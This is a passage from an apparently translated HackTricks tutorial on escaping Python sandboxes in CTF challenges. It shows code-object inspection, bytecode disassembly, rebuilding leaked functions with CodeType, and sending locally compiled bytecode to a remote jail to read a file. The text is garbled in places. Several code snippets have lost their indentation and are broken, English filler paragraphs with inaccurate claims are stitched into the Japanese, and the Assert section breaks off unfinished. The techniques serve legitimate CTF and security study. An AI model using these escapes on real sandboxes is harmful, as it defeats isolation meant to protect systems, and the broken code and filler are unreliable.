get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```
### コード情報の取得

To bypass Python sandboxes, it is crucial to gather as much information about the code as possible. This includes understanding the programming language, libraries, frameworks, and dependencies used in the code. By analyzing the code, you can identify potential vulnerabilities and weaknesses that can be exploited.

Here are some techniques to gather code information:

1. **Code Review**: Perform a thorough review of the code to understand its structure, logic, and functionality. Look for any insecure coding practices or potential vulnerabilities.

2. **Static Analysis**: Use static analysis tools to analyze the code without executing it. These tools can identify potential security issues, such as insecure input handling or code injection vulnerabilities.

3. **Dynamic Analysis**: Execute the code in a controlled environment to observe its behavior and identify any security weaknesses. This can be done using tools like debuggers or dynamic analysis frameworks.

4. **Dependency Analysis**: Identify the libraries and dependencies used by the code. Check for any known vulnerabilities or outdated versions that may be susceptible to attacks.

5. **Code Profiling**: Use profiling tools to gather information about the code's performance and resource usage. This can help identify any bottlenecks or potential vulnerabilities related to resource consumption.

By gathering comprehensive code information, you can better understand the code's security posture and devise effective strategies to bypass Python sandboxes.
```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```
### **関数の逆アセンブル**

To bypass Python sandboxes, it is often necessary to understand the inner workings of the sandboxing mechanisms. One way to do this is by disassembling the target function. Disassembling a function allows us to view the low-level assembly instructions that make up the function's code.

Python provides the `dis` module, which can be used to disassemble Python bytecode. By disassembling a function, we can analyze the bytecode instructions and gain insights into how the function operates.

To disassemble a function, we can use the `dis.dis()` function from the `dis` module. This function takes the function object as an argument and prints out the disassembled bytecode instructions.

Here is an example of how to disassemble a function:

```python
import dis

def target_function():
    x = 10
    y = 20
    z = x + y
    print(z)

dis.dis(target_function)
```

Running the above code will output the disassembled bytecode instructions for the `target_function`. By analyzing these instructions, we can understand how the function performs its operations and potentially find ways to bypass the sandboxing mechanisms.

Keep in mind that disassembling a function is just one step in the process of bypassing Python sandboxes. It is important to have a deep understanding of Python bytecode and the sandboxing mechanisms in order to effectively bypass the security measures in place.
```python
import dis
dis.dis(get_flag)
2           0 LOAD_CONST               1 (1)
3 STORE_FAST               1 (var1)

3           6 LOAD_CONST               2 ('secretcode')
9 STORE_FAST               2 (var2)

4          12 LOAD_CONST               3 ('some')
15 LOAD_CONST               4 ('array')
18 BUILD_LIST               2
21 STORE_FAST               3 (var3)

5          24 LOAD_FAST                0 (some_input)
27 LOAD_FAST                2 (var2)
30 COMPARE_OP               2 (==)
33 POP_JUMP_IF_FALSE       40

6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
39 RETURN_VALUE

8     >>   40 LOAD_CONST               6 ('Nope')
43 RETURN_VALUE
44 LOAD_CONST               0 (None)
47 RETURN_VALUE
```
もしPythonのサンドボックスで`dis`をインポートできない場合は、関数の**バイトコード**(`get_flag.func_code.co_code`)を取得し、ローカルで**逆アセンブル**することができます。変数の内容（`LOAD_CONST`）は表示されませんが、`LOAD_CONST`は変数のオフセットも示しているため、(`get_flag.func_code.co_consts`)から推測することができます。
```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
0 LOAD_CONST          1 (1)
3 STORE_FAST          1 (1)
6 LOAD_CONST          2 (2)
9 STORE_FAST          2 (2)
12 LOAD_CONST          3 (3)
15 LOAD_CONST          4 (4)
18 BUILD_LIST          2
21 STORE_FAST          3 (3)
24 LOAD_FAST           0 (0)
27 LOAD_FAST           2 (2)
30 COMPARE_OP          2 (==)
33 POP_JUMP_IF_FALSE    40
36 LOAD_CONST          5 (5)
39 RETURN_VALUE
>>   40 LOAD_CONST          6 (6)
43 RETURN_VALUE
44 LOAD_CONST          0 (0)
47 RETURN_VALUE
```
## Pythonのコンパイル

さて、実行できない関数の情報を**ダンプ**することができると仮定してみましょう。しかし、それを**実行する必要がある**場合です。\
次の例のように、その関数の**コードオブジェクトにアクセスできます**が、ディスアセンブルを読んでもフラグの計算方法がわからない場合を想像してください（より複雑な`calc_flag`関数を想像してください）。
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
```
### コードオブジェクトの作成

まず最初に、**コードオブジェクトを作成して実行する方法**を知る必要があります。これにより、漏洩した関数を実行するためのコードオブジェクトを作成することができます。
```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
co_nlocals, co_stacksize, co_flags,
co_code, co_consts, co_names,
co_varnames, co_filename, co_name,
co_firstlineno, co_lnotab, freevars=None,
cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```
{% hint style="info" %}
Pythonのバージョンによって、`code_type`の**パラメータ**の順序が異なる場合があります。実行しているPythonのバージョンでパラメータの順序を確認する最良の方法は、次のコマンドを実行することです。
```
import types
types.CodeType.__doc__
'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
```
{% endhint %}

### リークされた関数の再現

{% hint style="warning" %}
以下の例では、関数コードオブジェクトから関数を再現するために必要なすべてのデータを取得します。**実際の例**では、関数を実行するために必要なすべての**値**は、**リークする必要があるもの**です。
{% endhint %}
```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```
### 防御をバイパスする

この投稿の最初の例で、`compile`関数を使用して**任意のPythonコードを実行する方法**を見ることができます。これは興味深いことです。なぜなら、**ループを含むスクリプト全体をワンライナーで実行**することができるからです（同じことは**`exec`**を使用してもできます）。\
とはいえ、時には**ローカルマシンでコンパイルされたオブジェクトを作成**し、それを**CTFマシン**で実行することが便利な場合もあります（たとえば、CTFに`compiled`関数がない場合など）。

例えば、_./poc.py_を読み込む関数を手動でコンパイルして実行してみましょう。
```python
#Locally
def read():
return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```
もし`eval`や`exec`にアクセスできない場合、**適切な関数**を作成することができますが、それを直接呼び出すと通常は「制限モードでコンストラクタにアクセスできません」というエラーが発生します。そのため、**制限された環境ではない関数を使用してこの関数を呼び出す必要があります。**
```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```
## コンパイルされたPythonの逆コンパイル

[**https://www.decompiler.com/**](https://www.decompiler.com)のようなツールを使用すると、与えられたコンパイルされたPythonコードを**逆コンパイル**することができます。

**このチュートリアルをチェックしてください**：

{% content-ref url="../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
[.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
{% endcontent-ref %}

## その他のPython

### Assert

パラメータ`-O`で最適化されたPythonは、**デバッグ**の値に依存するアサート文やコードを削除します。\
したがって、以下のようなチェックは
```python
def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
```
## 参考文献

* [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
* [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
* [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
* [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python\_sandbox\_escape)
* [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
* [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より速く修正できるようにしましょう。Intruderは攻撃対象を追跡し、予防的な脅威スキャンを実行し、APIからWebアプリ、クラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンを入手**したいですか？または、**HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
